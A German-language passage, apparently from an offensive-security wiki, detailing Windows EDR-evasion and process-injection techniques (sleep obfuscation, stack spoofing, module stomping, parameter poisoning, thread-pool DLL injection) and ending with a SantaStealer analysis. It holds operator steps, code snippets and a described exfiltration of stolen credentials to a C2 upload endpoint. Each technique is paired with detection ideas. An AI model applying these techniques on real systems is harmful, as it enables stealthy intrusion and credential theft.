- Halte Wrapper klein und PIC-sicher; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patchen gespeichert hast, oder über LdrGetProcedureAddress.
- Verwende für PIC RW → RX-Übergänge und vermeide Seiten, die gleichzeitig beschreibbar und ausführbar sind.

Call-stack spoofing stub
- PIC-Stubs im Draugr-Stil erstellen eine gefälschte Aufrufkette (mit Rücksprungadressen in unauffälligen Modulen) und wechseln dann zur echten API.
- Dadurch werden Erkennungen umgangen, die für sensible APIs kanonische Stacks von Beacon/BOFs erwarten.
- Kombiniere dies mit Stack-Cutting-/Stack-Stitching-Techniken, um vor dem API-Prolog in erwarteten Frames zu landen.

Operative Integration
- Stelle den Reflective Loader den post-ex-DLLs voran, damit PIC und Hooks beim Laden der DLL automatisch initialisiert werden.
- Verwende ein Aggressor-Skript, um Ziel-APIs zu registrieren, sodass Beacon und BOFs transparent denselben Evasion-Pfad nutzen, ohne dass Codeänderungen erforderlich sind.

Erkennungs-/DFIR-Aspekte
- IAT-Integrität: Einträge, die auf Nicht-Image-Adressen (Heap/anonym) verweisen; regelmäßige Überprüfung von Import-Zeigern.
- Stack-Anomalien: Rücksprungadressen, die zu keinem geladenen Image gehören; abrupte Übergänge zu Nicht-Image-PIC; inkonsistente RtlUserThreadStart-Abstammung.
- Loader-Telemetrie: Schreibzugriffe im Prozess auf die IAT, frühe DllMain-Aktivität, die Import-Thunks verändert, unerwartete RX-Bereiche, die beim Laden erstellt werden.
- Umgehung der Image-Ladeüberwachung: Wenn LoadLibrary* gehookt wird, verdächtige Ladevorgänge von Automatisierungs-/CLR-Assemblies überwachen, die mit Memory-Masking-Ereignissen korrelieren.

Verwandte Bausteine und Beispiele
- Reflective Loader, die während des Ladens IAT-Patching durchführen (z. B. TitanLdr, AceLdr)
- Memory-Masking-Hooks (z. B. simplehook) und Stack-Cutting-PIC (stackcutting)
- PIC-Call-Stack-Spoofing-Stubs (z. B. Draugr)


## Import-Time-IAT-Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time-IAT-Hooks über ein residentes PICO

Wenn du einen Reflective Loader kontrollierst, kannst du Imports während `ProcessImports()` hooken, indem du den `GetProcAddress`-Zeiger des Loaders durch einen benutzerdefinierten Resolver ersetzt, der zuerst nach Hooks sucht:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Erstelle ein **residentes PICO** (persistentes PIC-Objekt), das bestehen bleibt, nachdem das temporäre Loader-PIC sich selbst freigegeben hat.
- Exportiere eine Funktion `setup_hooks()`, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- Überspringe in `_GetProcAddress` ordinale Imports und verwende eine hashbasierte Hook-Suche wie `__resolve_hook(ror13hash(name))`. Wenn ein Hook vorhanden ist, gib ihn zurück; andernfalls delegiere an das echte `GetProcAddress`.
- Registriere Hook-Ziele beim Linken mit Crystal-Palace-Einträgen der Form `addhook "MODULE$Func" "hook"`. Der Hook bleibt gültig, da er sich im residenten PICO befindet.

So erhältst du **IAT-Umleitung zum Importzeitpunkt**, ohne nach dem Laden den Codeabschnitt der geladenen DLL zu patchen.

### Hookbare Imports erzwingen, wenn das Ziel PEB-Walking verwendet

Import-time-Hooks werden nur ausgelöst, wenn sich die Funktion tatsächlich in der IAT des Ziels befindet. Wenn ein Modul APIs per PEB-Walk + Hash auflöst (ohne Import-Eintrag), erzwinge einen echten Import, damit der Pfad `ProcessImports()` des Loaders ihn erfasst:

- Ersetze die Auflösung gehashter Exporte (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, wodurch der Reflective Loader den Import beim Auflösen abfangen kann.

### Ekko-artige Sleep-/Idle-Obfuscation ohne `Sleep()` zu patchen

Statt `Sleep` zu patchen, hooke die **tatsächlichen Wait-/IPC-Primitiven**, die das Implantat verwendet (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Bei langen Wartezeiten verpackst du den Aufruf in eine Obfuscation-Kette im Ekko-Stil, die das In-Memory-Image während der Inaktivität verschlüsselt:<sup>[[31]](#references)[[27]](#references)</sup>

- Verwende `CreateTimerQueueTimer`, um eine Abfolge von Callbacks einzuplanen, die `NtContinue` mit präparierten `CONTEXT`-Frames aufrufen.
- Typische Kette (x64): Image auf `PAGE_READWRITE` setzen → mit `advapi32!SystemFunction032` das gesamte gemappte Image per RC4 verschlüsseln → den blockierenden Wait ausführen → per RC4 entschlüsseln → **die Berechtigungen der einzelnen Abschnitte wiederherstellen**, indem die PE-Abschnitte durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert eine Vorlage für `CONTEXT`; klone sie in mehrere Frames und setze die Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt aufzurufen.

Operatives Detail: Gib bei langen Wartezeiten (z. B. `WAIT_OBJECT_0`) „success“ zurück, damit der Aufrufer fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während Inaktivitätsfenstern vor Scannern und vermeidet die klassische Signatur eines „gepatchten `Sleep()`“.

Erkennungsideen (telemetriebasiert)
- Häufungen von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` verweisen.
- `advapi32!SystemFunction032` wird auf großen, zusammenhängenden Puffern in Image-Größe verwendet.
- `VirtualProtect` auf einem großen Bereich, gefolgt von der benutzerdefinierten Wiederherstellung der Berechtigungen einzelner Abschnitte.

### Laufzeitregistrierung von CFG für Sleep-Obfuscation-Gadgets

Bei CFG-aktivierten Zielen führt der erste indirekte Sprung in ein Mid-Function-Gadget wie `jmp [rbx]` oder `jmp rdi` üblicherweise zum Absturz des Prozesses mit `STATUS_STACK_BUFFER_OVERRUN`, da das Gadget nicht in den CFG-Metadaten des Moduls enthalten ist. Damit Ekko-/Kraken-artige Ketten in gehärteten Prozessen funktionieren:<sup>[[30]](#references)</sup>

- Registriere jedes indirekte Ziel der Kette mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Bei Adressen in geladenen Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` an der **Image-Basis** beginnen und die **gesamte Image-Größe** umfassen.
- Verwende für manuell gemappte/PIC-/gestompte Bereiche stattdessen die **Allokationsbasis** und die Allokationsgröße.
- Markiere nicht nur das Dispatch-Gadget, sondern auch indirekt erreichte Exporte (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait-/Event-Systemaufrufe) sowie alle ausführbaren, vom Angreifer kontrollierten Abschnitte, die zu indirekten Zielen werden.

Dadurch werden Sleep-Ketten im ROP-/JOP-Stil von „funktioniert nur in Prozessen ohne CFG“ zu einer wiederverwendbaren Primitive für `explorer.exe`, Browser, `svchost.exe` und andere mit `/guard:cf` kompilierte Endpunkte.

### CET-sicheres Stack-Spoofing für schlafende Threads

Ein vollständiger Austausch von `CONTEXT` ist auffällig und kann auf CET-Shadow-Stack-Systemen scheitern, da ein gefälschtes `Rip` weiterhin mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Muster für Sleep-Masking ist:<sup>[[30]](#references)</sup>

- Wähle einen anderen Thread im selben Prozess und lies dessen `NT_TIB`-/TEB-Stackgrenzen (`StackBase`, `StackLimit`) über `NtQueryInformationThread` aus.
- Sichere den echten TEB/TIB des aktuellen Threads.
- Erfasse den echten schlafenden Kontext mit `GetThreadContext`.
- Kopiere **nur** das echte `Rip` in den Spoof-Kontext und lasse den gefälschten `Rsp`-/Stack-Zustand unverändert.
- Kopiere während des Sleep-Fensters den `NT_TIB` des gefälschten Threads in den aktuellen TEB, damit Stack-Walker innerhalb eines legitimen Stack-Bereichs auflösen.
- Stelle nach Ende des Waits den ursprünglichen TIB und Thread-Kontext wieder her.

Dadurch bleibt der Instruction Pointer mit CET vereinbar, während EDR-Stack-Walker getäuscht werden, die den TEB-Stack-Metadaten zur Validierung des Unwindings vertrauen.

### APC-basierte Alternative: Kraken Mask

Wenn Timer-Queue-Dispatch zu signaturanfällig ist, kann dieselbe Sleep-Encrypt-Spoof-Restore-Sequenz über eine angehaltene Hilfsthread mithilfe eingereihter APCs ausgeführt werden:<sup>[[27]](#references)</sup>

- Erstelle einen Hilfsthread mit `NtTestAlert` als Einstiegspunkt.
- Reiht vorbereitete `CONTEXT`-Frames/APCs mit `NtQueueApcThread` ein und führe sie mit `NtAlertResumeThread` aus.
- Speichere den Kettenzustand auf dem Heap statt auf dem Stack des Hilfsthreads, um ein Erschöpfen des standardmäßigen 64-KB-Thread-Stacks zu vermeiden.
- Verwende `NtSignalAndWaitForSingleObject`, um atomar das Start-Event zu signalisieren und zu blockieren.
- Halte den Hauptthread an, bevor du den TIB/Kontext wiederherstellst (`NtSuspendThread` → Wiederherstellen → `NtResumeThread`), um das Zeitfenster zu verkleinern, in dem ein Scanner einen nur teilweise wiederhergestellten Stack erfassen könnte.

Damit wird die Signatur `CreateTimerQueueTimer` + `NtContinue` durch eine Hilfsthread-/APC-Signatur ersetzt, während dieselben Ziele für RC4-Masking und Stack-Spoofing erhalten bleiben.

Zusätzliche Erkennungsideen
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleeps, Waits oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext` in Verbindung mit `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe`.
- Auf `NtQueryInformationThread` folgende direkte Schreibzugriffe in die Stackgrenzen des TEB/TIB des aktuellen Threads.
- `NtQueueApcThread`-/`NtAlertResumeThread`-Ketten, die indirekt `SystemFunction032`, `VirtualProtect` oder Hilfsfunktionen zur Wiederherstellung der Abschnittsberechtigungen erreichen.
- Wiederholte Verwendung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots innerhalb signierter Module.


## Präzises Module Stomping

Module Stomping führt Payloads aus dem **`.text`-Abschnitt einer DLL aus, die bereits im Zielprozess gemappt ist**, statt auffälligen privaten ausführbaren Speicher zu allokieren oder eine neue sacrificial DLL zu laden. Das Überschreibziel sollte ein **geladenes, dateigestütztes Image** sein, dessen Codebereich die Payload aufnehmen kann, ohne Codepfade zu beschädigen, die der Prozess weiterhin benötigt.<sup>[[1]](#references)[[2]](#references)</sup>

### Zuverlässige Zielauswahl

Naives Stomping gängiger Module wie `uxtheme.dll` oder `comctl32.dll` ist fragil: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Codebereich lässt den Prozess abstürzen. Ein zuverlässigerer Ablauf:

1. Zähle die Module des Zielprozesses auf und erstelle eine **Include-Liste, die nur Namen enthält**, von bereits geladenen DLLs.
2. Erstelle zuerst die Payload und notiere ihre **exakte Bytegröße**.
3. Durchsuche DLLs auf der Festplatte und vergleiche die PE-Abschnittsgröße **`.text` `Misc_VirtualSize`** mit der Payload-Größe. Das ist wichtiger als die Dateigröße, da sie die Größe des ausführbaren Abschnitts **im gemappten Zustand** widerspiegelt.
4. Parse die **Export Address Table (EAT)** und wähle die RVA einer exportierten Funktion als Start-Offset für das Stomping.
5. Berechne den **Wirkungsbereich**: Wenn die Payload die ausgewählte Funktionsgrenze überschreitet, überschreibt sie benachbarte Exporte, die danach im Speicher angeordnet sind.

Typische Recon-/Auswahl-Hilfsprogramme aus der Praxis:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Bevorzuge DLLs, die im Remote-Prozess **bereits geladen** sind, um die Telemetrie von `LoadLibrary`-Aufrufen und unerwarteten Image-Ladevorgängen zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung nur selten ausgeführt werden. Andernfalls können normale Codepfade die gestomped Bytes vor oder nach der Thread-Erstellung erreichen.
- Bei großen Implants muss die Einbettung des Shellcodes oft von einem Stringliteral auf einen **Byte-Array-/Braced-Initializer** umgestellt werden, damit der vollständige Buffer im Injector-Quellcode korrekt dargestellt wird.

Detection ideas
- Remote-Schreibvorgänge in ausführbare, image-backed Pages (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt in die üblicheren privaten RWX-/RX-Allokationen.
- Export-Einstiegspunkte, deren Bytes im Speicher nicht mehr mit der Backing-Datei auf der Festplatte übereinstimmen.
- Remote Threads oder Context-Pivots, deren Ausführung innerhalb eines legitimen DLL-Exports beginnt, dessen erste Bytes kürzlich geändert wurden.
- Verdächtige `VirtualProtect(Ex)`-/`WriteProcessMemory`-Sequenzen gegen DLL-`.text`-Pages, auf die eine Thread-Erstellung folgt.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ist eine **Process-Injection-/EDR-Evasion-Technik**, die den klassischen Remote-Write-Pfad (`VirtualAllocEx` + `WriteProcessMemory`) umgeht. Anstatt Bytes in ein bereits laufendes Ziel zu kopieren, nutzt sie aus, dass Windows **ausgewählte Startparameter von `CreateProcessW` in den Child-Prozess kopiert** und in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) speichert.<sup>[[28]](#references)[[29]](#references)</sup>

### Durch `CreateProcessW` kopierbare Poisoning-Träger

Nützliche Träger sind:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (mit `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktische Einschränkungen der Träger:

- `lpCommandLine` muss für `CreateProcessW` auf **beschreibbaren Speicher** zeigen und ist auf **32.767 Unicode-Zeichen** einschließlich des Nullterminators begrenzt.
- `lpEnvironment` muss ein Unicode-Umgebungsblock aus aufeinanderfolgenden `NAME=VALUE\0`-Strings sein, auf die ein zusätzliches `\0` folgt.
- `lpReserved` ist offiziell reserviert. Daher sollte die Zuordnung zu `ShellInfo` als Implementierungsdetail und nicht als stabiler, dokumentierter Vertrag betrachtet werden.

Dadurch wird die normale Prozesserstellung zum **Payload-Transfer-Primitiv**. Der Operator erstellt den Child-Prozess mit vom Angreifer kontrollierten Startdaten und lässt Windows die prozessübergreifende Kopie durchführen.

### Remote-Lookup-Ablauf ohne Remote-Write-APIs

Nach der Erstellung des Child-Prozesses wird der kopierte Buffer mithilfe von **schreibgeschützten** Primitiven aufgelöst:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` abrufen
2. Den Remote-`PEB` auslesen
3. `PEB.ProcessParameters` folgen
4. `RTL_USER_PROCESS_PARAMETERS` auslesen
5. Den ausgewählten Pointer verwenden:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimaler Ablauf:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Ausführen des kopierten Parameterpuffers

Der kopierte Parameterbereich ist normalerweise `RW`, nicht ausführbar. Eine gängige P3-Kette ist:

1. Den Prozess normal erstellen (nicht angehalten)
2. Die ausgewählte Parameterseite mit `NtProtectVirtualMemory` / `VirtualProtectEx` ausführbar machen
3. Den bereits in `PROCESS_INFORMATION` zurückgegebenen Handle des Hauptthreads wiederverwenden
4. Die Ausführung mit `NtSetContextThread` umleiten (`CONTEXT_CONTROL`, `RIP` überschreiben)

Im Gegensatz zu klassischen Thread-Hijacking-Abläufen sind dafür **`SuspendThread` / `ResumeThread` nicht erforderlich**; der Kontext kann direkt über den zurückgegebenen Handle des Hauptthreads geändert werden.

Dadurch werden mehrere APIs vermieden, die häufig auf Injection überwacht werden:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- häufig auch `SuspendThread` / `ResumeThread`

### Einschränkung durch Nullbytes und gestaffelter Shellcode

Alle drei Träger bestehen aus **String- oder stringähnlichen Daten**, daher wird ein roher Payload mit `0x00` während der Übertragung abgeschnitten. Eine praktikable Lösung ist eine **nullbytefreie erste Stufe**, die Konstanten zur Laufzeit rekonstruiert und dann eine beliebige zweite Stufe lädt.

Ein einfaches Muster ist die XOR-basierte Konstantenerzeugung:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Dadurch kann die erste Stufe Stack-Strings, API-Argumente, DLL-Pfade oder einen Shellcode-Loader für die zweite Stufe erstellen, ohne Nullbytes in den übertragenen Parameter einzubetten.

### Stack-basierte API-Aufrufe aus der ersten Stufe

Wenn die erste Stufe APIs wie `LoadLibraryA` aufrufen muss, kann sie:

- den String/Puffer auf den Stack des Ziels legen
- den **32-Byte-x64-Shadow-Space** reservieren
- `RCX`, `RDX`, `R8`, `R9` auf Konstanten oder `RSP`-relative Zeiger setzen
- `RSP` vor dem Aufruf **16-Byte-ausgerichtet** halten

Eine zweite Stufe kann dann vom Stack in eine `PAGE_READWRITE`-Allokation kopiert, mit `VirtualProtect` auf `PAGE_EXECUTE_READ` umgestellt und angesprungen werden. So wird eine direkte RWX-Allokation vermieden.

### Erkennungsideen

Gute Möglichkeiten zur Suche, die von den Autoren genannt werden:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, die **Prozessparameter-Seiten ausführbar** machen
- auf diese Schutzänderung folgendes `SetThreadContext` / `NtSetContextThread`
- Remote-Lesezugriffe auf `PEB` und anschließend auf `RTL_USER_PROCESS_PARAMETERS`
- ungewöhnlich lange Werte oder Werte mit hoher Entropie für `lpCommandLine`, `lpEnvironment` oder `STARTUPINFO.lpReserved` während der Prozesserstellung

### Hinweise

- P3 ist ein **prozessübergreifender Übertragungstrick** und für sich allein keine vollständige Ausführungsprimitive: Für den kopierten Parameter sind weiterhin eine Änderung der Ausführungsberechtigung und eine Methode zur Ausführungsumleitung erforderlich.
- `RtlCreateProcessReflection` / Dirty Vanity wurde von den Autoren in Betracht gezogen, aber verworfen, weil intern verdächtige Primitive wie `NtWriteVirtualMemory` und `NtCreateThreadEx` aufgerufen werden.

## Console-STDIN-Pipe-Injection

Ein interaktiver Konsolenprozess kann ebenfalls als **Payload-Transfer-Primitive** dienen. Der Injector leitet die Standardeingabe des Kindprozesses auf eine Pipe um und sendet einen Marker gefolgt von Shellcode. Nachdem das Konsolenprogramm die Daten in seinen eigenen privaten Speicher eingelesen hat, sucht der Injector diesen Puffer, macht ihn ausführbar und leitet einen Thread des Kindprozesses dorthin um. Dadurch werden `VirtualAllocEx` und `WriteProcessMemory` vermieden, es handelt sich jedoch weiterhin um Process Injection und nicht um einen allgemeinen EDR-Bypass.<sup>[[41]](#references)</sup>

Trotz der Beschreibung als „named pipe“ ruft die Referenzimplementierung `CreatePipe` auf, wodurch eine **anonyme Pipe** erstellt wird. Windows implementiert anonyme Pipes intern mit eindeutig benannten Pipe-Objekten, aber der PoC wählt weder einen `\\.\pipe\<name>`-Pfad aus noch ruft er `CreateNamedPipe` auf. Er erstellt vererbbare Handles mit einem standardmäßigen Sicherheitsdeskriptor, setzt das Lese-Handle in `STARTUPINFO.hStdInput`, aktiviert `STARTF_USESTDHANDLES` und startet einen neuen Kindprozess mit aktivierter Handle-Vererbung. Daher startet dieser PoC die angegebene Konsolenanwendung; er verbindet seine Pipe nicht mit einem bestehenden Prozess.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referenz-Workflow

Die Implementierung verwendet die folgende Kette:<sup>[[41]](#references)</sup>

1. Anonyme Pipe-Paare für `STDIN` und `STDOUT` des Kindprozesses erstellen. Die Vererbung für die beiden Handles auf Elternseite deaktivieren und nach der Prozesserstellung die Duplikate auf Kindseite im Elternprozess schließen.
2. Eine interaktive ausführbare Datei wie `netsh.exe` oder `nslookup.exe` mit `CREATE_NEW_CONSOLE` starten. Der Kindprozess erbt die umgeleiteten Standard-Handles.
3. Das vollständige binäre `rawData`-Array mit `WriteFile` über das `STDIN`-Handle auf Elternseite senden. Das Konsolenprogramm verarbeitet die Bytes und hinterlässt eine Kopie in einem seiner privaten, committeten Speicherbereiche.
4. Mit `VirtualQueryEx` den Adressraum des Kindprozesses durchlaufen, mögliche `MEM_PRIVATE`-Bereiche mit `ReadProcessMemory` lesen und am Anfang von `rawData` nach dem Marker suchen.
5. Den gefundenen Puffer mit `VirtualProtectEx` auf `PAGE_EXECUTE_READWRITE` umstellen.
6. Den Hauptthread identifizieren, anhalten, `RIP` mit `NtSetContextThread` auf `found_address + 0x19` setzen und den Thread fortsetzen.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die bereitgestellte Implementierung ist spezifisch für x64: Sie ändert `CONTEXT.Rip`, und ihr eingebettetes Payload ist x64-Shellcode. `rawData` beginnt mit einem 25 Byte langen Marker, daher beginnen die ausführbaren Bytes am hexadezimalen Offset `0x19`. Achten Sie beim Ersetzen des Payloads darauf, dieses Layout beizubehalten oder Marker, Suchvektor, Arraygröße und Ausführungs-Offset gemeinsam zu aktualisieren. In den Quellkommentaren sind außerdem `0x0A`, `0x0D` und `0x1A` als unerwünschte Zeichen aufgeführt. Dieser Ablauf ändert weder das Token noch die Berechtigungen des Child-Prozesses.<sup>[[41]](#references)</sup>

Kompilierungsmuster für kleine native Helfer und Payloads finden Sie unter [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Thread-Pool-Callback-DLL-Injection ohne Shellcode (DLLParty)

DLLParty passt eine Injection nach PoolParty-Art an, sodass ein vorhandener Worker des Zielprozesses `LoadLibraryA` aufruft, anstatt einen injizierten Callback-Stub auszuführen. Die Dispatch-Primitive ist ein `TP_DIRECT`-Completion-Eintrag, der in den I/O-Completion-Port des Ziel-Thread-Pools eingereiht wird. Dies umgeht keine Prozessberechtigungen: Der PoC ruft `OpenProcess(PROCESS_ALL_ACCESS)` auf und benötigt les- und beschreibbaren Speicher im Zielprozess sowie duplizierbare Worker-Factory- und Completion-Port-Handles.<sup>[[46]](#references)[[47]](#references)</sup>

Unter Windows x64 übergibt der Worker einen Zeiger auf eine stackbasierte `TP_CALLBACK_INSTANCE` in `RCX`, das erste Callback-Argument. `LoadLibraryA` interpretiert denselben Zeiger als `LPCSTR`. Auf dem getesteten Ausführungspfad erstellt `TppWorkerThread` den Zeiger bei `RSP+0x178`, während der erste reguläre Schreibzugriff auf dieses Objekt bei `RSP+0x1d0` erfolgt. Ein nullterminierter DLL-Pfad, der in dieses Präfix von 0x58 Byte passt, kann daher am Anfang der Instanz abgelegt werden, ohne vor dem Dispatch überschrieben zu werden. Dies ist eine buildabhängige Beobachtung und keine dokumentierte Windows-ABI-Garantie.<sup>[[46]](#references)[[47]](#references)</sup>

Der Referenzablauf lautet:<sup>[[46]](#references)[[47]](#references)</sup>

1. Die Handles des Ziels mit `NtQuerySystemInformation(SystemHandleInformation)` auflisten und `TpWorkerFactory` anhand der Objekttypen identifizieren. Ein Worker-Factory-Handle duplizieren und `WorkerFactoryBasicInformation` abfragen; `StartParameter` liefert den entfernten `TP_POOL`. Factories mit `TotalWorkerCount == 0` überspringen.
2. `TP_POOL.CompletionPort` auslesen und die private Worker-Liste des Pools durchlaufen. Im getesteten x64-Build von Windows 10 19045 (`ntdll.dll 10.0.19041.4842`) befindet sich ihr Kopf bei `pool+0x60`; jeder Link liegt bei `worker+0x10`, daher entspricht der Callback-Instanz-Slot bei `worker+0x38` dem Wert `link+0x28`. Der PoC prüft Zeigerausrichtung, wechselseitige Verknüpfungen, Pool-Zugehörigkeit, nichtnull Thread-IDs, wiederholte Knoten und einen stabilen Listen-Kopf.
3. Den DLL-Pfad in **jeden** ermittelten Worker-Slot schreiben, da der eingereihte Completion-Eintrag von jedem Worker verarbeitet werden kann. Ein `TP_DIRECT` mit `Callback = LoadLibraryA` im beschreibbaren Speicher des Zielprozesses ablegen. Der PoC verwendet `last_slot-0x500` auf einem Worker-Stack statt `VirtualAllocEx`; dieser Offset ist experimentell und darf nicht mit aktiven Stack-Daten kollidieren.
4. Das Handle des Completion-Ports im Zielprozess duplizieren und `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` aufrufen. Die Adresse des entfernten `TP_DIRECT` ist der Completion Key. Ein vorhandener Worker ruft dann `LoadLibraryA` mit seinem überschriebenen Callback-Instanz-Zeiger auf und lädt eine DLL, auf die der Zielprozess bereits zugreifen kann.

Der PoC erwartet eine Ziel-PID (`DLLParty.exe <target_pid>`) und verwendet einen fest codierten DLL-Pfad in `DLLParty.cpp`; legen Sie vor dem Erstellen einer x64-Executable einen Pfad fest, auf den der Zielprozess zugreifen kann. Außerdem verwendet er die `LoadLibraryA`-Adresse des eigenen Prozesses als entfernten Callback und setzt daher voraus, dass diese Adresse im Zielprozess gültig ist. Der Code prüft weder, ob die Pfadlänge in das 0x58-Byte-Präfix passt, noch, ob beim Durchlaufen der Worker-Liste ein Slot gefunden wurde, bevor das letzte Element indiziert wird. Überprüfen Sie die privaten Offsets, das Stack-Layout und den beschreibbaren Speicher für den Ziel-Build erneut. Der Verzicht auf `CreateRemoteThreadEx`, Shellcode und `VirtualAllocEx` verhindert weder Schreibzugriffe zwischen Prozessen noch Telemetrie zum Laden von DLLs.<sup>[[46]](#references)[[47]](#references)</sup>

## SantaStealer-Taktiken für dateilose Umgehung und Diebstahl von Zugangsdaten

SantaStealer (auch bekannt als BluelineStealer) zeigt, wie moderne Info-Stealer AV-Umgehung, Anti-Analyse und den Zugriff auf Zugangsdaten in einem einzigen Ablauf kombinieren.<sup>[[24]](#references)</sup>

### Prüfung des Tastaturlayouts und Sandbox-Verzögerung

- Ein Konfigurations-Flag (`anti_cis`) listet mithilfe von `GetKeyboardLayoutList` die installierten Tastaturlayouts auf. Wird ein kyrillisches Layout gefunden, legt das Sample eine leere `CIS`-Markierung an und beendet sich, bevor es Stealer ausführt. So wird sichergestellt, dass es sich in ausgeschlossenen Regionen nicht ausführt, während zugleich ein Artefakt für die Suche zurückbleibt.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mehrschichtige `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten rollierenden Prüfsumme und vergleicht diese mit eingebetteten Blocklisten für Debugger/Sandboxen. Anschließend berechnet sie die Prüfsumme erneut für den Computernamen und überprüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B untersucht Systemeigenschaften (Mindestanzahl von Prozessen, kurze Systemlaufzeit), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox Additions zu erkennen, und führt Timing-Prüfungen rund um Sleeps durch, um Single-Stepping zu erkennen. Bei jedem Treffer wird abgebrochen, bevor die Module gestartet werden.

### Dateiloser Helper + doppeltes ChaCha20-Reflective Loading

- Die primäre DLL/EXE enthält einen Chromium-Credential-Helper, der entweder auf die Festplatte geschrieben oder manuell im Arbeitsspeicher gemappt wird. Im dateilosen Modus löst er Imports/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
- Dieser Helper speichert eine zweite DLL-Stufe, die zweimal mit ChaCha20 verschlüsselt wurde (zwei 32-Byte-Schlüssel + 12-Byte-Nonces). Nach beiden Durchläufen lädt er den Blob per Reflective Loading (ohne `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, die von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) abgeleitet sind.<sup>[[25]](#references)</sup>
- Die ChromElevator-Routinen verwenden Reflective Process Hollowing mit Direct Syscalls, um Code in einen aktiven Chromium-Browser einzuschleusen, AppBound-Encryption-Schlüssel zu übernehmen und Passwörter/Cookies/Kreditkartendaten direkt aus SQLite-Datenbanken zu entschlüsseln – trotz der ABE-Härtung.


### Modulare In-Memory-Erfassung & HTTP-Exfiltration in Chunks

- `create_memory_based_log` durchläuft eine globale Funktionszeigertabelle `memory_generators` und startet für jedes aktivierte Modul (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.) einen Thread. Jeder Thread schreibt Ergebnisse in gemeinsame Puffer und meldet nach einer Join-Frist von etwa 45 Sekunden die Anzahl seiner Dateien.
- Nach Abschluss wird alles mit der statisch gelinkten Bibliothek `miniz` als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` wartet dann 15 Sekunden und überträgt das Archiv per HTTP POST in 10-MB-Chunks an `http://<C2>:6767/upload`. Dabei wird eine Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) vorgetäuscht. Jeder Chunk enthält `User-Agent: upload`, `auth: <build_id>` und optional `w: <campaign_tag>`. Der letzte Chunk hängt `complete: true` an, damit der C2 weiß, dass die Zusammensetzung abgeschlossen ist.

## References

